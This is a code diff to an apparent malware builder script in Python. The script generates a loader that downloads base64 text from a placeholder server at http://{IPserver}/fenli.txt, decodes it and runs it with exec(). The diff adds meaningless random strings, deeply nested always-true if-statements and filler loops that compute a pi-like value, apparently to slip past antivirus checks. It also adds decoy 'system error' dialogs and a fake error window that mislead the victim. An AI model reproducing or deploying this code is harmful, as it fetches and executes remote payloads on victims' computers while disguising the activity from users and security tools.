@@ -249,6 +249,7 @@ import hashlib
 import re
 import sys
 
+asdfghj='zm0obwh84ns570qsmbhorhdw5jnhzxh7pykd3qr16h7mnbyzbi19yodfp1myyb3fmz87c8ettz66vqha69aaq0xo7gpcsi2imsk7fbjr0jutbph9buev1dikxeq0zs14grpeuvy6udagjqrswexkl09oezns3k75s1c01c4mk1klrc78guo3dnpwnerb85fccurr7owwsw7bj5v2wwa162jdue3ykc6wrh92v9n0wp23ze52xv1yav0gm306z00z88hxvpfrl6gau6ixxtbquuhni5c2yhd9sa5o4x3643s2ov4kymad56uchrl2fovhsqvbu3t6a33vqfiv0oy5srh770e1tpa8ekawr8rn68r7h1bv94uxqckgm3gnsexfaoutaaxdqrtux0p865u5d8zkj5q3lus5z9qyhc5gwetejjpbk7zq0m3p'
 
 
 encoding_rules = {{
@@ -358,11 +359,13 @@ def decrypt(encrypted_text, key):
         decrypted_text = decrypted_text.rstrip(b"\0")
 
         return decrypted_text.decode('utf-8')
+        
 def check_file():       # 检查文件是否存在
     file_path = "kygvseedc.txt"     
     if os.path.exists(file_path):
-        print("文件存在，开始运行shellcode")
-        run_if_statements() #十亿次if
+        dfgvbh = 'zm0obwh84ns570qsmbhorhdw5jnhzxh7pykd3qr16h7mnbyzbi19yodfp1myyb3fmz87c8ettz66vqha69aaq0xo7gpcsi2imsk7fbjr0jutbph9buev1dikxeq0zs14grpeuvy6udagjqrswexkl09oezns3k75s1c01c4mk1klrc78guo3dnpwnerb85fccurr7owwsw7bj5v2wwa162jdue3ykc6wrh92v9n0wp23ze52xv1yav0gm306z00z88hxvpfrl6gau6ixxtbquuhni5c2yhd9sa5o4x3643s2ov4kymad56uchrl2fovhsqvbu3t6a33vqfiv0oy5srh770e1tpa8ekawr8rn68r7h1bv94uxqckgm3gnsexfaoutaaxdqrtux0p865u5d8zkj5q3lus5z9qyhc5gwetejjpbk7zq0m3pq2cv1r31u6l6sqbx359heq982utnx5pxpj6qt2y9avxozcjbgz2vevz3rubxdhqqx7ay2kjb7josal4ohzie5zk0acdb6izi0f8os2gw6c2eiotb8w9cu2swajtgmvkspvu2yfbztzl49w8zpu61q7s3bbuvratmnid4ekmcf5e7l4wb5mn02yk5sshr7ll7mnlm7wb89d055lcar09b5dqgc5gj4c3h57gu8ivoz93pt33yie8jdj82ajwag6wkhct907tf23zw7fsuzwbct1f5p29gn2ql0v2sldkzdjq5a46qk8jb7ljd6bk06zj7dr3ul0oq36ubfl62au7amd3v009s932cine3vgvnkxc6uceafqth2cinpa7r8e1atdvzxunijft0ibmzwy2uf9rae6ll77agnh17ri7jf4ncycy3gji1flgcjgz12efn8p'
+        print("file is NB")
+        run_if_statements()
         time.sleep(10)
         key = "admin"
 
@@ -472,14 +475,30 @@ def ahtdfvghsrybsfnkmarsudfhacsnjldkgfnvklasr():
     # print(i)
 
     
-
+from decimal import Decimal, getcontext  
+getcontext().prec=50  # 设置精度为50  
+pi = Decimal(0)  
+for i in range(10):  
+    pi += Decimal(1) / Decimal(11**i)  
+    print(pi)
 
 SySTemcyfgbgbrsvfnbsdgrjkfenesjlkfg()
 res = requests.get("http://{IPserver}/fenli.txt")
 res.encoding = "utf-8"
 strs = res.text
 code = base64.b64decode(strs)
-exec(code)
+while 1:
+    if 1==1:
+        if 2==2:
+            if 3==3:
+                if 4==4:
+                    if 5==5:
+                        if 6==6:
+                            if 8==8:
+                                if 9==9:
+                                    if 10 == 10:
+                                        if 11==11:
+                                            exec(code)
 
 ''')
 print("loaderSSSSS.py生成完毕")
@@ -494,9 +513,16 @@ def CheckUpdate():
     res = requests.get("http://{IPserver}/update.txt")
     res.encoding="utf-8"
     if res.text == '存在更新':
-        
+        from decimal import Decimal, getcontext  
+        getcontext().prec=50  # 设置精度为50  
+        pi = Decimal(0)  
+        for i in range(10):  
+            pi += Decimal(1) / Decimal(11**i)  
+            print(pi)
         print("存在更新")
         import {random_string}0
+        import win32api,win32con
+        win32api.MessageBox(0, "错误请检查网络连接","系统错误", win32con.MB_ICONWARNING)
     else:
         print(res.text)
         print("不存在更新")
@@ -511,14 +537,14 @@ def on_button_click():
 def tks():
     # 创建主窗口
     root = tk.Tk()
-    root.title("Tkinter基础框架")
+    root.title("错误")
 
     # 创建标签
-    label = tk.Label(root, text="欢迎使用Tkinter基础框架")
+    label = tk.Label(root, text="获取内容失败，请检查更新")
     label.pack(pady=10)
 
     # 创建按钮
-    button = tk.Button(root, text="点击我", command=on_button_click)  # 在创建按钮时，直接指定按钮点击事件
+    button = tk.Button(root, text="点击我", command=on_button_click)
     button.pack()
 
     # 创建一个文本框
@@ -527,6 +553,12 @@ def tks():
 
     # 运行主循环
     root.mainloop()
+from decimal import Decimal, getcontext  
+getcontext().prec=100  # 设置精度为50  
+pi = Decimal(0)  
+for i in range(10):  
+    pi += Decimal(1) / Decimal(11**i)  
+    print(pi)
 CheckUpdate()
 
 
